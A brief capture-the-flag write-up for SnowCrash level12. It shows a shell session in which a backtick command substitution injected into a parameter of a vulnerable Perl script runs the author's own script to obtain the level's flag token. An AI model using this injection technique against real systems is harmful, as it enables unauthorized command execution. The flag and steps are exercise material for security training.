### Exploit

Yet another Perl script with unprotected parameters. Do they ever learn? 

```
    level12@SnowCrash:~$ cat /tmp/TOKEN
    #!/bin/sh
    getflag > /tmp/key
    level12@SnowCrash:~$ ./level12.pl "?x="`/*/TOKEN`""
    /tmp/TOKEN: 2: /tmp/TOKEN: cannot create /tmp/key: Permission denied
    Content-type: text/html

    ..level12@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The proof is in the pudding...
